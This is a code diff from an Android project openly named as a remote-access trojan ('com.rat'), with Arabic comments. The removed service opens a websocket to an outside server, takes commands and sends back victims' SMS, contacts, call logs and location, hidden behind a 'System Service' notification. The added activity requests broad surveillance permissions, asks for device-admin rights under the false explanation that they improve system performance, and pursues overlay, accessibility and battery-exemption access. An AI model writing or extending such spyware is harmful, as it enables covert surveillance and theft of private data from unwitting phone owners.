@@ -1,80 +1,69 @@
 package com.rat
 
-import android.app.*
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
+import android.net.Uri
 import android.os.Build
-import android.os.IBinder
-import androidx.core.app.NotificationCompat
-import okhttp3.*
-import org.json.JSONObject
-import java.util.concurrent.TimeUnit
+import android.os.Bundle
+import android.provider.Settings
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 
-class MainService : Service() {
-    private lateinit var webSocket: WebSocket
-    private val client = OkHttpClient.Builder()
-        .pingInterval(30, TimeUnit.SECONDS)
-        .build()
+class MainActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
 
-    private val deviceId = "device_" + System.currentTimeMillis()
+        // 1. طلب الأذونات العادية
+        val perms = arrayOf(
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.CALL_PHONE,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            android.Manifest.permission.POST_NOTIFICATIONS
+        )
+        ActivityCompat.requestPermissions(this, perms, 100)
 
-    override fun onCreate() {
-        super.onCreate()
-        startForeground(1, buildNotification())
-        connect()
-    }
-
-    private fun connect() {
-        val request = Request.Builder().url("wss://my-server-pjy2.onrender.com/ws/$deviceId").build()
-        webSocket = client.newWebSocket(request, object : WebSocketListener() {
-            override fun onOpen(webSocket: WebSocket, response: Response) {}
-            override fun onMessage(webSocket: WebSocket, text: String) {
-                handleCommand(text)
+        // 2. تفعيل مدير الجهاز (Device Admin)
+        val admin = ComponentName(this, AdminReceiver::class.java)
+        val dpm = getSystemService(DevicePolicyManager::class.java)
+        if (!dpm.isAdminActive(admin)) {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "لتحسين أداء النظام.")
             }
-            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
-                Thread.sleep(5000)
-                connect()
-            }
-        })
-    }
-
-    private fun handleCommand(raw: String) {
-        try {
-            val obj = JSONObject(raw)
-            val reqId = obj.getString("req_id")
-            val action = obj.getString("action")
-            val args = obj.optJSONObject("args") ?: JSONObject()
-
-            val result = when (action) {
-                "sms_dump" -> SmsHandler.dump(this)
-                "contacts_dump" -> ContactsHandler.dump(this)
-                "call_logs" -> CallLogHandler.dump(this)
-                "location" -> LocationHandler.get(this)
-                "battery" -> InfoHandler.battery(this)
-                else -> "unknown action"
-            }
-
-            val response = JSONObject()
-            response.put("req_id", reqId)
-            response.put("data", result)
-            webSocket.send(response.toString())
-        } catch (e: Exception) {
-            e.printStackTrace()
+            startActivity(intent)
         }
-    }
 
-    private fun buildNotification(): Notification {
-        val channelId = "rat_ch"
+        // 3. صلاحية العرض فوق التطبيقات
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+        }
+
+        // 4. صلاحية تعديل إعدادات النظام
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
+            startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:$packageName")))
+        }
+
+        // 5. صلاحية إمكانية الوصول (Accessibility)
+        try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {}
+
+        // 6. استثناء من تحسين البطارية
+        val power = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))
+        try { startActivity(power) } catch (_: Exception) {}
+
+        // 7. تشغيل الخدمة بالخلفية
+        val intent = Intent(this, MainService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW)
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            startForegroundService(intent)
+        } else {
+            startService(intent)
         }
-        return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("System Service")
-            .setContentText("Running")
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .build()
     }
-
-    override fun onBind(intent: Intent?): IBinder? = null
 }
